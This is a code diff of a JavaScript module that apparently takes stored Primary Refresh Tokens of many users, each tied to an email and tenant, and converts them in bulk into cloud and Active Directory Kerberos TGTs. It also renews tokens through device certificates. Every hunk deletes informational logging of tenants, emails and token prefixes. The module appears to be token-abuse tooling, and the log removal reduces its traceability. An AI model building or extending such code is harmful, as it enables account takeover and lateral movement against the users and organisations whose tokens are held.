@@ -137,7 +137,6 @@ async function deriveKerberosTGTs(prt, refreshToken, tenant, clientId, sessionKe
   const prtCheck = validatePrtForKerberos(prt, tenant);
   if (!prtCheck.ok) {
     results.error = 'PRT not eligible for Kerberos derivation: ' + prtCheck.reason;
-    console.warn('[Kerberos]', results.error, '| tenant:', tenant, '| prtPrefix:', (prt || '').substring(0, 16));
     return results;
   }
 
@@ -151,12 +150,6 @@ async function deriveKerberosTGTs(prt, refreshToken, tenant, clientId, sessionKe
       const adResult = await deriveADTGT(prt, tenant, results.session_key);
       Object.assign(results, adResult);
     }
-
-    console.log('[Kerberos] TGT derivation complete:', {
-      hasCloudTGT: !!results.tgt_cloud,
-      hasADTGT: !!results.tgt_ad,
-      hasSessionKey: !!results.session_key
-    });
 
   } catch (err) {
     console.error('[Kerberos] TGT derivation failed:', err.message);
@@ -268,8 +261,6 @@ async function deriveCloudTGT(prt, tenant, clientId) {
       throw new Error('No TGT cloud received from autologon endpoint');
     }
 
-    console.log('[Kerberos] Cloud TGT derived successfully for tenant:', tenant);
-
   } catch (err) {
     console.error('[Kerberos] Cloud TGT derivation failed:', err.message);
     throw err;
@@ -325,7 +316,6 @@ async function deriveADTGT(prt, tenant, sessionKey) {
       }
 
       results.session_key = sessionKey;
-      console.log('[Kerberos] AD TGT derived successfully for tenant:', tenant);
     } else {
       // Some tenants may not return AD TGT - this is normal for cloud-only tenants
       console.warn('[Kerberos] AD TGT not returned (cloud-only tenant or no on-prem integration)');
@@ -373,11 +363,8 @@ async function bulkDeriveTGTs(limit = 50) {
     );
 
     if (!tokens || tokens.length === 0) {
-      console.log('[Kerberos] No tokens requiring TGT derivation found');
       return stats;
     }
-
-    console.log('[Kerberos] Found', tokens.length, 'tokens requiring TGT derivation');
 
     for (const token of tokens) {
       stats.processed++;
@@ -444,7 +431,6 @@ async function bulkDeriveTGTs(limit = 50) {
           );
 
           stats.success++;
-          console.log('[Kerberos] Updated token', token.id, 'for', token.email);
         } else {
           stats.skipped++;
         }
@@ -454,8 +440,6 @@ async function bulkDeriveTGTs(limit = 50) {
         console.error('[Kerberos] Failed to derive TGT for token', token.id, ':', tokenErr.message);
       }
     }
-
-    console.log('[Kerberos] Bulk derivation complete:', stats);
 
   } catch (err) {
     console.error('[Kerberos] Bulk derivation failed:', err.message);
@@ -507,7 +491,6 @@ async function deriveTGTForToken(tokenId) {
         const refreshOrPrt = refreshToken || prt;
         if (refreshOrPrt) {
           renewedPrt = await getPrtCookie(clientAssertion, refreshOrPrt, tenant);
-          console.log('[Kerberos] Refreshed PRT via device certificate for token', token.id);
         }
       } catch (renewErr) {
         console.error('[Kerberos] Device certificate renewal failed:', renewErr.message);
@@ -527,13 +510,7 @@ async function deriveTGTForToken(tokenId) {
       return { success: false, error: 'Cannot derive TGTs without specific tenant ID (got: ' + tenant + ')' };
     }
 
-    // Diagnostic: log what's actually in the stored PRT so failures are explainable
     const prtClaims = parsePrtClaims(effectivePrt);
-    console.log('[Kerberos] Deriving TGTs for token', token.id, 'email', token.email, 'tenant', tenant,
-      '| prtPrefix:', (effectivePrt || '').substring(0, 16),
-      '| prtParsed:', !!prtClaims,
-      '| acrs:', prtClaims && Array.isArray(prtClaims.acrs) ? prtClaims.acrs : null,
-      '| prt.tid:', prtClaims && prtClaims.tid || null);
 
     // Derive TGTs
     const derivationResult = await deriveKerberosTGTs(
